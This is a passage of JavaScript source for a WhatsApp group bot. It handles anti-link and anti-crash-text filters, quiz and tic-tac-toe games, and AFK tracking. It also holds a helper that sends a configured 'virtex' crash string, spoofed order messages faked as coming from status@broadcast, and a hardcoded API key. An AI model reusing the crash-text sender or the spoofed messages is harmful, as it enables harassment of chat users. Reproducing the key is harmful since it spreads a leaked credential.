//═══════[© 2022 Fazrin Mauza (xZrinva)]════════\\

//~you can re-upload but tag my channel
//or put my channel link in the description.
//~you can recode or copy the codes but give
//credit.

//═══════[modules]════════\\

require('./settings')
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@adiwajshing/baileys')
const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const { exec, spawn, execSync } = require("child_process")
const axios = require('axios')
const path = require('path')
const os = require('os')
const moment = require('moment-timezone')
const { JSDOM } = require('jsdom')
const speed = require('performance-now')
const { performance } = require('perf_hooks')
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()
const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom } = require('./lib/myfunc')
let { addLevelingId, addLevelingLevel, addLevelingXp, getLevelingId, getLevelingLevel, getLevelingXp } = require("./lib/lvlfunction")
const speedofbot = require("performance-now")
//var XMLHttpRequest = require("xmlhttprequest").XMLHttpRequest;
//var xhr = new XMLHttpRequest();

//[thumb]\\
let logonya = fs.readFileSync('./BotMedia/logo.jpg')

//[database]\\
const antilink = JSON.parse(fs.readFileSync('./database/antilink.json'))
const antivirtex = JSON.parse(fs.readFileSync('./database/antivirtex.json'))
const antiwame = JSON.parse(fs.readFileSync('./database/antiwame.json'))
const automsg = JSON.parse(fs.readFileSync('./database/automsg.json'))
const welkom = JSON.parse(fs.readFileSync('./database/welkom.json'))

//[database reader]\\
global.db = JSON.parse(fs.readFileSync('./src/database.json'))
if (global.db) global.db = {
    sticker: {},
    database: {},
    game: {},
    others: {},
    users: {},
    chats: {},
    ...(global.db || {})
}
let tebaklagu = db.game.tebaklagu = []
let _family100 = db.game.family100 = []
let kuismath = db.game.math = []
let tebakgambar = db.game.tebakgambar = []
let tebakkata = db.game.tebakkata = []
let caklontong = db.game.lontong = []
let caklontong_desk = db.game.lontong_desk = []
let tebakkalimat = db.game.kalimat = []
let tebaklirik = db.game.lirik = []
let tebaktebakan = db.game.tebakan = []
let vote = db.others.vote = []
	
module.exports = Pajrin = async (Pajrin, m, chatUpdate, store) => {
    try {
        var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
        var budy = (typeof m.text == 'string' ? m.text : '')
        var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
        const isCmd = body.startsWith(prefix)
        const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()
        const type = Object.keys(mek.message)[0]        
        const args = body.trim().split(/ +/).slice(1)
        const arg = body.substring(body.indexOf(' ') + 1)
        const pushname = m.pushName || "No Name"
        const botNumber = await Pajrin.decodeJid(Pajrin.user.id)
        const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const itsMe = m.sender == botNumber ? true : false
        const text = q = args.join(" ")
        const quoted = m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
	    const isMedia = /image|video|sticker|audio/.test(mime)  
		let imagedevil =  fs.readFileSync("./BotMedia/logo.jpg")
//[gc]\\
        const groupMetadata = m.isGroup ? await Pajrin.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const isAntiLink = m.isGroup ? antilink.includes(m.chat) : false
        const isAntiVirtex = m.isGroup ? antivirtex.includes(m.chat) : false
        const isAntiWame = m.isGroup ? antiwame.includes(m.chat) : false
        const isAutoMsg = m.message ? automsg.includes(m.chat) : false
        const isWelkom = m.message ? welkom.includes(m.chat) : false
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
    	const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
    	const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
	const isPremium = isCreator || global.premium.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender) || false
	
//════════[runtime]═════════//
const runtime = function (seconds) {
seconds = Number(seconds);
var d = Math.floor(seconds / (3600 * 24));
var h = Math.floor((seconds % (3600 * 24)) / 3600);
var m = Math.floor((seconds % 3600) / 60);
var s = Math.floor(seconds % 60);
var dDisplay = d > 0 ? d + (d == 1 ? " day, " : " Day, ") : "";
var hDisplay = h > 0 ? h + (h == 1 ? " hour, " : " Hour, ") : "";
var mDisplay = m > 0 ? m + (m == 1 ? " minute, " : " Minute, ") : "";
var sDisplay = s > 0 ? s + (s == 1 ? " second" : " Second") : "";
return dDisplay + hDisplay + mDisplay + sDisplay;
}
	
//[target]\\
      const sendWebp = async(to, url) => {
           var names = Date.now() / 10000;
           var download = function (uri, filename, callback) {
           request.head(uri, function (err, res, body) {
           request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
});
};
           download(url, './sticker' + names + '.png', async function () {
           console.log('selesai');
           let filess = './sticker' + names + '.png'
           let asw = './sticker' + names + '.webp'
           exec(`ffmpeg -i ${filess} -vf "scale=512:512:force_original_aspect_ratio=increase,fps=40, crop=512:512" ${asw}`, (err) => {
           fs.unlinkSync(filess)
           if (err) return reply(`${err}`)
           exec(`webpmux -set exif ./sticker/data.exif ${asw} -o ${asw}`, async (error) => {
           if (error) return reply(`${error}`)
           Pajrin.sendMessage(m.chat, fs.readFileSync(asw), sticker, {sendEphemeral:true, quoted:mek})
           fs.unlinkSync(asw)
});
});
});
}

const cel =  {
             key: { fromMe: false,remoteJid: "status@broadcast", participant: '0@s.whatsapp.net'}, message: {orderMessage: {itemCount: 2021, status: 200, thumbnail: imagedevil, surface: 200, message: fake, orderTitle: '𝘽𝙧𝙤𝙖𝙙𝙘𝙖𝙨𝙩', sellerJid: '0@s.whatsapp.net'} } }       
const ftroli =  {
             key: { fromMe: false,remoteJid: "status@broadcast", participant: '0@s.whatsapp.net'}, message: {orderMessage: {itemCount: 2021, status: 200, thumbnail: imagedevil, surface: 200, message: fake, orderTitle: '𝑰𝒕𝒔 𝑴𝒆 ?\n𝑪𝒓𝒆𝒂𝒕𝒐𝒓 : ko', sellerJid: '0@s.whatsapp.net'} } }       
const fkon =  {
             key: { fromMe: false,remoteJid: "status@broadcast", participant: '0@s.whatsapp.net'}, message: {orderMessage: {itemCount: 2021, status: 200, thumbnail: imagedevil, surface: 200, message: fake, orderTitle: '𝑰𝒕𝒔 𝑴𝒆 ?\n𝑪𝒓𝒆𝒂𝒕𝒐𝒓 : ko', sellerJid: '0@s.whatsapp.net'} } }       
     

const katalog = (teks) => {
            res = Pajrin.prepareMessageFromContent(m.chat,{ "orderMessage": { "itemCount": -73926483, "message": teks, "footerText": "𝑰𝒕𝒔 𝑴𝒆 𝐑𝐚𝐟𝐚𝐭𝐚 𝐛𝐨𝐭𝐳 ?\n𝑪𝒓𝒆𝒂𝒕𝒐𝒓 : 𝐑𝐚𝐟𝐥𝐢 𝐆𝐚𝐧𝐳", "thumbnail": imagedevil, "surface": 'CATALOG' }}, {quoted:ftroli})
            Pajrin.relayWAMessage(res)
        }
           
	const reply = (teks) => {
            Pajrin.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": ` ${global.botnma}`,"body": ` Join Bot's Official GC`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": global.groupwa }}}, { quoted: m})
        }
        
        const virtek = (teks) => {
            Pajrin.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": ` ${global.virtex}`,"body": `${global.virtex}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": `${global.virtex}`}}})
        }
        
        const replay = (teks) => {
            Pajrin.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": ` ${global.fake}`,"body": ` © 2022 ${global.botnma} by ${global.ownernma}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": global.medsos1url }}}, { quoted: m})
        }
try {
            let isNumber = x => typeof x === 'number' && !isNaN(x)
            let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
            let user = global.db.users[m.sender]
            if (typeof user !== 'object') global.db.users[m.sender] = {}
            if (user) {
                if (!isNumber(user.afkTime)) user.afkTime = -1
                if (!('afkReason' in user)) user.afkReason = ''
                if (!isNumber(user.limit)) user.limit = limitUser
            } else global.db.users[m.sender] = {
                afkTime: -1,
                afkReason: '',
                limit: limitUser,
            }
            let chats = global.db.chats[m.chat]
                if (typeof chats !== 'object') global.db.chats[m.chat] = {}
                if (chats) {
                if (!('mute' in chats)) chats.mute = false
                if (!('wame' in chats)) chats.wame = false
             } else global.db.chats[m.chat] = {
                mute: false,
                wame: false,
        }
        } catch (err) {
            console.error(err)
        }
	    

//[public/self]\\
        if (!Pajrin.public) {
            if (!m.key.fromMe) return
        }

//[push msg to console \\
        if (m.message) {
        //  Pajrin.sendReadReceipt(m.chat, m.sender, [m.key.id])
            console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> In'), chalk.green(m.isGroup ? pushname : 'Private Chat', m.chat))

   }
//[autoread] ON/OF setting in config.js\\
       if (global.autoread === 'on') {
       if (m.message) {
	Pajrin.sendReadReceipt(m.chat, m.sender, [m.key.id])
	}
	}
	  if (m.key.remoteJid === 'status@broadcast') {
Pajrin.sendReadMessages([m.key])
}
	//const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
		//const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
		//const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
		//const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')

//[level(incomplete, still in devment)]\\
const levelRole = getLevelingLevel(m.sender)
	  var role = 'bronz'
	  if (levelRole <= 3) {
	role = 'Copper'
	  } else if (levelRole <= 5) {
	role = 'Iron'
	  } else if (levelRole <= 7) {
	role = 'Silver'
	  } else if (levelRole <= 10) {
	role = 'Gold'
	  } else if (levelRole <= 12) {
	role = 'Platinum'
	  } else if (levelRole <= 15) {
	role = 'Mithril'
	  } else if (levelRole <= 18) {
	role = 'Orichalcum'
	  } else if (levelRole <= 25) {
	role = 'Adamantite'
	  } else if (levelRole <= 45) {
	role = 'Good In Game'
	  }
	
//[Antilink]\\

	if (!m.isGroup) 
	if (body.startsWith('L')) {               
               	let anu = await fetchJson(`https://xteam.xyz/simsimi?kata=${text}&APIKEY=93e274b718d606e9`)
m.reply(`${budy}`)
} else if (body.startsWith('jo')) {              
               	let anu = await fetchJson(`https://xteam.xyz/simsimi?kata=${text}&APIKEY=93e274b718d606e9`)
m.reply(`${budy}`)
}

if (m.isGroup) 
if (budy.includes('izin')) {
if (m.isBaileys) {               

	tex = m.quoted ? m.quoted.text ? m.quoted.text : q ? q : m.text : q ? q : m.text
	
	Pajrin.sendMessage(m.chat, { text : `hj`, mentions: participants.map(a => a.id)})
	}
	}
	
	
	
//ANTI VIRTEX === AUTO BLOCK 
if (!m.isGroup) 
if (body.length > 50000)  {
               if (!m.key.fromMe) {
               	     if (isCreator) return m.reply(`Owner bot mah bebas kirim virtek :v`)            
        let users = m.sender 
let users2 = m.sender.replace(/[^0-9]/g, '')
        let buttons = [
                     {buttonId: `#unblockuser ${users}`, buttonText: {displayText: `⭕BUKA BLOCKIR ${users2}⭕`}, type: 1}
                ]
                let buttonMessage = {
                    text: `https://wa.me/${users2} terdeteksi mengirim pesan ke BOT dengan lebih dari 50k karakter,itu memiliki potensi VIRTEX\n\n BOT telah memblokir nomor tersebut,Jika ini merupakan kesalahan ,Anda sebagai owner BOT bisa membuka blokir dengan cara menekan tombol di bawah`,
                    footer: `Unblock pengguna`,
                    buttons: buttons,
                    headerType: 2
                }
            Pajrin.sendMessage(`${global.pemilik}@s.whatsapp.net`, buttonMessage)
        m.reply(`*VIRTEX DETECTED* \n\nAnda terdeteksi mengirimkan virtex\nBot akan memblokir nomor kamu!`)
        await sleep(5000)          
        await Pajrin.updateBlockStatus(users, 'block') 
        }
        }
                //read sw

        
//ANTI VIRTEX IN GROUP === AUTO KICK 
if (!isAntiVirtex) 
if (m.isGroup) 
if (body.length > 50000)  {
               if (!m.key.fromMe) {
               	if (isAdmins) return m.reply(`Admin group mah bebas kirim virtek :v`)             
        if (isCreator) return m.reply(`Owner bot mah bebas kirim virtek :v`)             
               	   let sianj = m.sender  
             let buttons = [
                     {buttonId: `#antivirtex off`, buttonText: {displayText: 'MATIKAN Anti virtex 📴'}, type: 1},
{buttonId: `#adduser ${sianj}`, buttonText: {displayText: 'Add kembali user yang terkick 🔙'}, type: 1}                    
                ]
                let buttonMessage = {
                    text: ' *VIRTEX DETECTED* \n\nAnda terdeteksi mengirimkan virtex' ,
                    footer: `Good Bye To You..👋🏻`,
                    buttons: buttons,
                    headerType: 2
                }
            Pajrin.sendMessage(m.chat, buttonMessage, { quoted: m })
             await sleep(3000)            
               await Pajrin.groupParticipantsUpdate(m.chat, [sianj], 'remove')
               }
	  }  
	
	  //ANTI LINK GC IN GROUP === AUTO KICK 
	if (isAntiLink) 
	if (m.isGroup) 
if (budy.includes('chat.whatsapp.com')) {
               if (!m.key.fromMe) {
               	if (isAdmins) return m.reply(`Admin group mah bebas kirim link gc :v`)
        if (isCreator) return m.reply(`Owner bot mah bebas kirim link gc :v`)
            let sianj = m.sender   
    let buttons = [
                     {buttonId: `#antilink off`, buttonText: {displayText: 'MATIKAN Anti Link GC📴'}, type: 1},
{buttonId: `#adduser ${sianj}`, buttonText: {displayText: 'Add kembali user yang terkick 🔙'}, type: 1}                    
                ]
                let buttonMessage = {
                    text: '*LINK DETECTED*\n\nAnda terdeteksi menyebarkan Link Group WhatsApp di area dilarang share link group' ,
                    footer: `Good Bye To You..👋🏻`,
                    buttons: buttons,
                    headerType: 2
                }
            Pajrin.sendMessage(m.chat, buttonMessage, { quoted: m })
             await sleep(3000)            
               await Pajrin.groupParticipantsUpdate(m.chat, [sianj], 'remove')
               }
	  }
	
	//ANTI wa.me IN GROUP === AUTO KICK 
	if (isAntiWame) 
	if (m.isGroup) 
if (budy.includes('wa.me/')) {
               if (!m.key.fromMe) {
               	if (isAdmins) return m.reply(`Admin group mah bebas kirim link wa.me :v`)
        if (isCreator) return m.reply(`Owner bot mah bebas kirim link wa.me :v`)
               let sianj = m.sender   
                   let buttons = [
                     {buttonId: `#antiwame off`, buttonText: {displayText: 'MATIKAN Anti wa.me 📴'}, type: 1},
{buttonId: `#adduser ${sianj}`, buttonText: {displayText: 'Add kembali user yang terkick 🔙'}, type: 1}                    
                ]
                let buttonMessage = {
                    text: '*LINK DETECTED*\n\nAnda terdeteksi menyebarkan Link wa.me di area dilarang share link wa.me' ,
                    footer: `Good Bye To You..👋🏻`,
                    buttons: buttons,
                    headerType: 2
                }
            Pajrin.sendMessage(m.chat, buttonMessage, { quoted: m })
             await sleep(3000)            
               await Pajrin.groupParticipantsUpdate(m.chat, [sianj], 'remove')
               }
	  }
	
//[mute chat]\\
      if (db.chats[m.chat].mute && !isAdmins && !isCreator) {
      return
      }
//[write database every 1min]\\
	setInterval(() => {
            fs.writeFileSync('./src/database.json', JSON.stringify(global.db, null, 2))
        }, 60 * 1000)

//[reset limit every 12hrs]\\
        let cron = require('node-cron')
        cron.schedule('00 12 * * *', () => {
            let user = Object.keys(global.db.users)
            let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
            for (let jid of user) global.db.users[jid].limit = limitUser
            console.log('Reseted Limit')
        }, {
            scheduled: true,
            timezone: "Asia/Jakarta"
        })
	    
//[respond cmd with media]\\
        if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.sticker)) {
        let hash = global.db.sticker[m.msg.fileSha256.toString('base64')]
        let { text, mentionedJid } = hash
        let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
            userJid: Pajrin.user.id,
            quoted: m.quoted && m.quoted.fakeObj
        })
        messages.key.fromMe = areJidsSameUser(m.sender, Pajrin.user.id)
        messages.key.id = m.key.id
        messages.pushName = m.pushName
        if (m.isGroup) messages.participant = m.sender
        let msg = {
            ...chatUpdate,
            messages: [proto.WebMessageInfo.fromObject(messages)],
            type: 'append'
        }
        Pajrin.ev.emit('messages.upsert', msg)
        }
	    
	if (('family100'+m.chat in _family100) && isCmd) {
            kuis = true
            let room = _family100['family100'+m.chat]
            let teks = budy.toLowerCase().replace(/[^\w\s\-]+/, '')
            let isSurender = /^((me)?give up|surr?ender)$/i.test(m.text)
            if (!isSurender) {
                let index = room.jawaban.findIndex(v => v.toLowerCase().replace(/[^\w\s\-]+/, '') === teks)
                if (room.terjawab[index]) return !0
                room.terjawab[index] = m.sender
            }
            let isWin = room.terjawab.length === room.terjawab.filter(v => v).length
            let caption = `
Answer the following questions :\n${room.soal}\n\n\nThere is ${room.jawaban.length} Answer ${room.jawaban.find(v => v.includes(' ')) ? `(some answers have spaces)` : ''}
${isWin ? `All Answers Answered` : isSurender ? 'Give up!' : ''}
${Array.from(room.jawaban, (jawaban, index) => {
        return isSurender || room.terjawab[index] ? `(${index + 1}) ${jawaban} ${room.terjawab[index] ? '@' + room.terjawab[index].split('@')[0] : ''}`.trim() : false
    }).filter(v => v).join('\n')}
    ${isSurender ? '' : `Perfect Player`}`.trim()
            Pajrin.sendText(m.chat, caption, m, { contextInfo: { mentionedJid: parseMention(caption) }}).then(mes => { return _family100['family100'+m.chat].pesan = mesg }).catch(_ => _)
            if (isWin || isSurender) delete _family100['family100'+m.chat]
        }

        if (tebaklagu.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaklagu[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await Pajrin.sendButtonText(m.chat, [{ buttonId: '#tebak lagu', buttonText: { displayText: 'Guess The Music' }, type: 1 }], `🎮 Guess The Song 🎮\n\nCorrect Answer 🎉\n\nWant to play again? press the button below`,  `${global.fake}`, m)
                delete tebaklagu[m.sender.split('@')[0]]
            } else reply('*Wrong answer!*')
        }

        if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = kuismath[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await reply(`🎮 Math Quiz  🎮\n\nCorrect answer 🎉\n\nWant to play again? Send ${prefix}math mode`)
                delete kuismath[m.sender.split('@')[0]]
            } else reply('*Wrong Answer!*')
        }

        if (tebakgambar.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakgambar[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await Pajrin.sendButtonText(m.chat, [{ buttonId: '#tebak gambar', buttonText: { displayText: 'Guess The Picture' }, type: 1 }], `🎮 Guess The Picture 🎮\n\nCorrect answer 🎉\n\nWant to play again? press the button below`,  `${global.fake}`, m)
                delete tebakgambar[m.sender.split('@')[0]]
            } else reply('*Wrong Answer!*')
        }

        if (tebakkata.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakkata[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await Pajrin.sendButtonText(m.chat, [{ buttonId: '#tebak kata', buttonText: { displayText: 'Guess The Word' }, type: 1 }], `🎮 Guess The Word 🎮\n\nCorrect answer 🎉\n\nWant to play again? press the button below`,  `${global.fake}`, m)
                delete tebakkata[m.sender.split('@')[0]]
            } else reply('*Wrong Answer!*')
        }

        if (caklontong.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = caklontong[m.sender.split('@')[0]]
	    deskripsi = caklontong_desk[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await Pajrin.sendButtonText(m.chat, [{ buttonId: '#tebak lontong', buttonText: { displayText: 'Guess Lontong' }, type: 1 }], `🎮 Guess Lontong 🎮\n\nCorrect answer 🎉\n*${deskripsi}*\n\nWant to play again? press the button below`,  `${global.fake}`, m)
                delete caklontong[m.sender.split('@')[0]]
		delete caklontong_desk[m.sender.split('@')[0]]
            } else reply('*Wrong Answer!*')
        }

        if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakkalimat[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await Pajrin.sendButtonText(m.chat, [{ buttonId: '#tebak kalimat', buttonText: { displayText: 'Guess The Sentence' }, type: 1 }], `🎮 Guess The Sentence 🎮\n\nCorrect answer 🎉\n\nWant to play again? press the button below`,  `${global.fake}`, m)
                delete tebakkalimat[m.sender.split('@')[0]]
            } else reply('*Wrong Answer!*')
        }

        if (tebaklirik.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaklirik[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await Pajrin.sendButtonText(m.chat, [{ buttonId: '#tebak lirik', buttonText: { displayText: 'Guess The Lyrics' }, type: 1 }], `🎮 Guess The Lyrics 🎮\n\nCorrect answer 🎉\n\nWant to play again? press the button below`,  `${global.fake}`, m)
                delete tebaklirik[m.sender.split('@')[0]]
            } else reply('*Wrong Answer!*')
        }
	    
	if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaktebakan[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await Pajrin.sendButtonText(m.chat, [{ buttonId: '#tebak tebakan', buttonText: { displayText: 'Riddles' }, type: 1 }], `🎮 Riddles 🎮\n\nCorrect answer 🎉\n\nWant to play again? press the button below`,  `${global.fake}`, m)
                delete tebaktebakan[m.sender.split('@')[0]]
            } else reply('*Wrong Answer!*')
        }
        
//[tictactoe]\\
	    this.game = this.game ? this.game : {}
	    let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
	    if (room) {
	    let ok
	    let isWin = !1
	    let isTie = !1
	    let isSurrender = !1
	    // reply(`[DEBUG]\n${parseInt(m.text)}`)
	    if (!/^([1-9]|(me)?nyerah|surr?ender|off|skip)$/i.test(m.text)) return
	    isSurrender = !/^[1-9]$/.test(m.text)
	    if (m.sender !== room.game.currentTurn) { 
	    if (!isSurrender) return !0
	    }
	    if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
	    reply({
	    '-3': 'Game has ended',
	    '-2': 'Invalid',
	    '-1': 'Invalid Position',
	    0: 'Invalid Position',
	    }[ok])
	    return !0
	    }
	    if (m.sender === room.game.winner) isWin = true
	    else if (room.game.board === 511) isTie = true
	    let arr = room.game.render().map(v => {
	    return {
	    X: '❌',
	    O: '⭕',
	    1: '1️⃣',
	    2: '2️⃣',
	    3: '3️⃣',
	    4: '4️⃣',
	    5: '5️⃣',
	    6: '6️⃣',
	    7: '7️⃣',
	    8: '8️⃣',
	    9: '9️⃣',
	    }[v]
	    })
	    if (isSurrender) {
	    room.game._currentTurn = m.sender === room.game.playerX
	    isWin = true
	    }
	    let winner = isSurrender ? room.game.currentTurn : room.game.winner
	    let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Win!` : isTie ? `Game over` : `Turn ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
❌: @${room.game.playerX.split('@')[0]}
⭕: @${room.game.playerO.split('@')[0]}

Type *give up* to surrender and admit defeat`
	    if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
	    room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
	    if (room.x !== room.o) await Pajrin.sendText(room.x, str, m, { mentions: parseMention(str) } )
	    await Pajrin.sendText(room.o, str, m, { mentions: parseMention(str) } )
	    if (isTie || isWin) {
	    delete this.game[room.id]
	    }
	    }

//[suit]\\
	    this.suit = this.suit ? this.suit : {}
	    let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
	    if (roof) {
	    let win = ''
	    let tie = false
	    if (m.sender == roof.p2 && /^(acc(ept)?|accept|sure|oke?|reject|dont|later|yes|can|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
	    if (/^(reject|dont|later|n|no|can)/i.test(m.text)) {
	    Pajrin.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} reject the suit, the suit is canceled`, m)
	    delete this.suit[roof.id]
	    return !0
	    }
	    roof.status = 'play'
	    roof.asal = m.chat
	    clearTimeout(roof.waktu)
	    //delete roof[roof.id].waktu
	    Pajrin.sendText(m.chat, `Suit has been sent to chat

@${roof.p.split`@`[0]} and 
@${roof.p2.split`@`[0]}

Please choose a suit in the respective chat"
click https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
	    if (!roof.pilih) Pajrin.sendText(roof.p, `Please select \n\nRock🗿\nPaper📄\nScissors✂️`, m)
	    if (!roof.pilih2) Pajrin.sendText(roof.p2, `Please select \n\nRock🗿\nPaper📄\nScissor✂️`, m)
	    roof.waktu_milih = setTimeout(() => {
	    if (!roof.pilih && !roof.pilih2) Pajrin.sendText(m.chat, `Both players don't want to play,\nSuit canceled`)
	    else if (!roof.pilih || !roof.pilih2) {
	    win = !roof.pilih ? roof.p2 : roof.p
	    Pajrin.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} didn't choose suit, game over`, m)
	    }
	    delete this.suit[roof.id]
	    return !0
	    }, roof.timeout)
	    }
	    let jwb = m.sender == roof.p
	    let jwb2 = m.sender == roof.p2
	    let g = /scissors/i
	    let b = /rock/i
	    let k = /paper/i
	    let reg = /^(scissors|rock|paper)/i
	    if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
	    roof.pilih = reg.exec(m.text.toLowerCase())[0]
	    roof.text = m.text
	    reply(`You have chosen ${m.text} ${!roof.pilih2 ? `\n\nWaiting for the opponent to choose` : ''}`)
	    if (!roof.pilih2) Pajrin.sendText(roof.p2, '_The opponent has chosen_\nNow it is your turn', 0)
	    }
	    if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
	    roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
	    roof.text2 = m.text
	    reply(`You have chosen ${m.text} ${!roof.pilih ? `\n\nWaiting for the opponent to choose` : ''}`)
	    if (!roof.pilih) Pajrin.sendText(roof.p, '_The opponent has chosen_\nNow it is your turn', 0)
	    }
	    let stage = roof.pilih
	    let stage2 = roof.pilih2
	    if (roof.pilih && roof.pilih2) {
	    clearTimeout(roof.waktu_milih)
	    if (b.test(stage) && g.test(stage2)) win = roof.p
	    else if (b.test(stage) && k.test(stage2)) win = roof.p2
	    else if (g.test(stage) && k.test(stage2)) win = roof.p
	    else if (g.test(stage) && b.test(stage2)) win = roof.p2
	    else if (k.test(stage) && b.test(stage2)) win = roof.p
	    else if (k.test(stage) && g.test(stage2)) win = roof.p2
	    else if (stage == stage2) tie = true
	    Pajrin.sendText(roof.asal, `_*Suit Results*_${tie ? '\nSERIES' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Win \n` : ` Lost \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Win \n` : ` Lost \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
	    delete this.suit[roof.id]
	    }
	    }
	    
	    let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
	    for (let jid of mentionUser) {
            let user = global.db.users[jid]
            if (!user) continue
            let afkTime = user.afkTime
            if (!afkTime || afkTime < 0) continue
            let reason = user.afkReason || ''
            reply(`
Don't tag him!
He's in Offline/AFK, ${reason ? 'with reason ' + reason : 'no reason'}
Its been ${clockString(new Date - afkTime)}
`.trim())
        }

        if (db.users[m.sender].afkTime > -1) {
            let user = global.db.users[m.sender]
            reply(`
You came back online from AFK${user.afkReason ? ' after ' + user.afkReason : ''}
In ${clockString(new Date - user.afkTime)}
`.trim())
            user.afkTime = -1
            user.afkReason = ''
        }

	    
        switch(command) {
	    case '12345afk': {
                let user = global.db.users[m.sender]
                user.afkTime = + new Date
                user.afkReason = text
                reply(`${m.pushName} Already Afk${text ? ': ' + text : ''}`)
            }
            break	
        case '12345ttc': case '12345ttt': case '12345tictactoe': {
